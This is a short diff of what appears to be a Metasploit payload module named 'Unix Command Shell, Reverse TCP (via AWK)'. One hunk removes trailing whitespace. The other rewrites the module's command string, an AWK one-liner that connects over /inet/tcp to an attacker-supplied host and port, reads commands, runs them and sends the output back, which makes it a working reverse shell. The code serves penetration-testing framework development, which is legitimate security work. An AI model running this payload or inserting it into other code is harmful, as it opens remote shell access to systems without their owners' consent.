@@ -19,7 +19,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Unix Command Shell, Reverse TCP (via AWK)',
 			'Description'   => 'Creates an interactive shell via AWK',
-			'Author'        => 
+			'Author'        =>
 				[
 					'espreto <robertoespreto[at]gmail.com>',
 					'Ulisses Castro <uss.thebug[at]gmail.com>',
@@ -51,7 +51,7 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"awk 'BEGIN{for(s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";s|&getline c;close(c)){while(c|& getline)print $0|& s}}'"
+		"awk 'BEGIN{s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
 	end
 
 end
